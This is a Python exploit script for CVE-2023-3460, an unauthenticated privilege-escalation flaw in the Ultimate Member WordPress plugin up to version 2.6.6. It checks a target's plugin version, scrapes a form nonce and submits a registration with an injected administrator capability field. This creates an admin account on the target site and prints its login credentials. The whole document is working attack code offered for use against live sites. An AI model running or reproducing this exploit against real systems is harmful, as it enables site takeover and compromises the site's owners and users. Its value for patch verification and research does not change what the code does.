"""
CVE-2023-3460 - Ultimate Member <= 2.6.6 - Unauthenticated Arbitrary User Creation
"""

import random
import string
import sys
import argparse
import re
import urllib3
import requests
from colorama import Fore, Style

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USERNAME = "eve" + ''.join(random.choice(string.ascii_letters) for _ in range(5))
PASSWORD = "Password1"
EMAIL =  USERNAME + "@gmail.com"

def is_vulnerable(target):
    """
    Check if the target is vulnerable to the exploit

    :param target: The target URL
    """
    print(Style.RESET_ALL + "Plugin version:", end=' ')
    try:
        r = requests.get(
            f"{target}/wp-content/plugins/ultimate-member/readme.txt", verify=False, timeout=5)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]

    except:
        print(Fore.RED + "Unable to get version")
        exit()

    if int(version.replace('.', '')) < 267:
        print(Fore.GREEN + f'{version} - Website is vulnerable to exploit')
    else:
        print(Fore.RED + f'{version} - Website is not vulnerable to exploit')
        exit()


def add_admin(target, form_id):
    """
    Add a new admin user to the target

    :param target: The target URL
    :param form_id: The form ID
    """
    headers = {
        # spoof user agent, not really needed
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    }

    s = requests.Session()
    try:
        r = s.get(f'{target}/?page_id=11', headers=headers, verify=False)
        nonce = re.search(
            r"name=\"_wpnonce\" value=\"(.{10})\"", r.text).groups()[0]
        print(Style.RESET_ALL + "Nonce fetched: ", Fore.GREEN + f"{nonce}")
    except:
        print(Fore.RED + "Unable to get nonce")
        exit()

    data = {
        f'user_login-{form_id}': USERNAME,
        f'user_email-{form_id}': EMAIL,
        f'user_password-{form_id}': PASSWORD,
        f'confirm_user_password-{form_id}': PASSWORD,
        f'first_name-{form_id}': 'Exploit',
        f'last_name-{form_id}': 'bySecragon',
        'form_id': form_id,
        'um_request': '',
        '_wpnonce': nonce,
        'wp_cÃ pabilities[administrator]': 1     # Exploit is here
    }

    print(Style.RESET_ALL + "Trying to add a new admin...\n")

    r = s.post(f'{target}/?page_id=11', data=data,
               headers=headers, verify=False)

    if len(r.history) > 0:
        if r.history[0].status_code == 302:
            print(Fore.GREEN + "Exploit success!")
        else:
            print(Fore.RED + "Exploit failed, something went wrong")
            exit()
    else:
        print(Fore.RED + "Exploit failed, no response")
        exit()

    print(Style.RESET_ALL +
          "\nLogin with the following credentials:")
    print(f'Username: {USERNAME} \nPassword: {PASSWORD}')


if __name__ == "__main__":
    print(Fore.BLUE + "\n\t\t --- CVE-2023-3460 ---")
    print(Style.RESET_ALL)

    parser = argparse.ArgumentParser()
    parser.add_argument('url', help='http://localhost:8000')

    if len(sys.argv) == 1:
        parser.print_help()
        exit()

    args = parser.parse_args()

    is_vulnerable(args.url)
    add_admin(args.url, 5)  # 5 is the default form ID
